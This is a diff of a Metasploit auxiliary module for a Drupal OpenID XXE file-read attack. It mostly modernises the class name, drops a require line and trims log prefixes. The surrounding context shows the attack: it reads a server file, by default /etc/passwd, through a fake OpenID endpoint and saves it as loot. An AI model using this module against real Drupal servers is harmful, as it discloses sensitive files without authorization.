@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer::HTML
   include REXML
@@ -45,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('TARGETURI', [ true, "Base Drupal directory path", '/drupal']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"])
-      ], self.class)
+      ])
 
   end
 
@@ -103,7 +98,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_openid_auth(signature)
 
     unless res
-      vprint_status("#{peer} - Connection timed out")
+      vprint_status("Connection timed out")
       return Exploit::CheckCode::Unknown
     end
 
@@ -134,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     unless res.code == 500
-      print_warning("#{peer} - Unexpected answer, trying to parse anyway...")
+      print_warning("Unexpected answer, trying to parse anyway...")
     end
 
     error_loot = parse_loot(res.body)
@@ -142,12 +137,12 @@ class Metasploit3 < Msf::Auxiliary
     # Check if file was retrieved on the drupal answer
     # Better results, because there isn't URL encoding,
     # plus probably allows to retrieve longer files.
-    print_status("#{peer} - Searching loot on the Drupal answer...")
+    print_status("Searching loot on the Drupal answer...")
     unless loot?(error_loot)
       # Check if file was leaked to the fake OpenID endpoint
       # Contents are probably URL encoded, plus probably long
       # files aren't full, but something is something :-)
-      print_status("#{peer} - Searching loot on HTTP query...")
+      print_status("Searching loot on HTTP query...")
       loot?(@http_loot)
     end
 
@@ -158,12 +153,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, request)
     if request.uri =~ /#{@prefix}/
-      vprint_status("#{peer} - Signature found, parsing file...")
+      vprint_status("Signature found, parsing file...")
       @http_loot = parse_loot(request.uri)
       return
     end
 
-    print_status("#{peer} - Sending XRDS...")
+    print_status("Sending XRDS...")
     send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
   end
 
@@ -189,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def store(data)
     path = store_loot("drupal.file", "text/plain", rhost, data, datastore['FILEPATH'])
-    print_good("#{peer} - File found and saved to path: #{path}")
+    print_good("File found and saved to path: #{path}")
   end
 
   def parse_loot(data)
